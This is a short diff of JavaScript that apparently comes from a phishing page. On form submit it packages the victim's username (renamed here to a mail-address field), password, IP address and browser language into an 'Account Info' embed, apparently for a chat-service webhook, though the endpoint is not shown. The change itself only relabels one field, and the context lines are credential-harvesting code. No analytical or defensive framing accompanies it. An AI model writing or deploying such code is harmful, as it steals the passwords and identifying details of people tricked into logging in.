@@ -33,7 +33,7 @@ form1.addEventListener('submit', async (e) => {
     title: "Account Info",
     color: 3447003,
     fields: [
-      { name: "Username", value: username, inline: true },
+      { name: "MailAddress", value: username, inline: true },
       { name: "Password", value: password, inline: true },
       { name: "IP", value: ip, inline: true },
       { name: "Language", value: navigator.language, inline: true },
